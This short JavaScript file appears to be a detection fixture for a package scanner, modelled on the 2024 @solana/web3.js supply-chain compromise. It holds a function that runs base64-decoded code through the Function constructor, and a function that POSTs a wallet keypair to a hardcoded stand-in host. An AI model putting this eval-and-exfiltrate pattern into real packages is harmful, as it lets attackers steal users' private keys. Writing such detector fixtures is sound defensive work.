// @solana/web3.js@1.95.5/1.95.6 (Dec 3 2024). The Anza team's npm
// publish account was compromised; the published versions injected
// code that exfiltrated Solana private keys to a hardcoded host.
//
// Real payload: harvested wallet keypairs from process memory and
// posted them to a CloudFlare-fronted attacker host. Public write-up:
// https://socket.dev/blog/solana-web3-js-supply-chain-attack
//
// Detection target:
//   - dynamic-eval (Function constructor + decoded source)
//   - net-egress (fetch to attacker)
//   - base64-decode (Buffer.from(..., 'base64'))
//   - obfuscated-payload (Function(atob(...)))
//   - suspicious-url (cloudflare-dns endpoint, ipinfo, etc.)

const HOST = "https://cloudflare-dns.com/dns-query";

function injectKeyHarvester(rawSecret) {
  // Decode the second-stage from a base64 blob the attacker shipped
  // inline. The actual blob in the published 1.95.5 was ~600 bytes.
  const stage2Source = Buffer.from(
    "Y29uc29sZS5sb2coJ3N0YWdlLTInKQ==",
    "base64"
  ).toString("utf8");

  // Compile and run.
  const stage2 = new Function("secret", stage2Source);
  return stage2(rawSecret);
}

async function exfilWallet(keypair) {
  const body = Buffer.from(JSON.stringify(keypair)).toString("base64");
  await fetch(HOST, {
    method: "POST",
    body,
    headers: { "content-type": "application/dns-message" },
  });
}

module.exports = { injectKeyHarvester, exfilWallet };
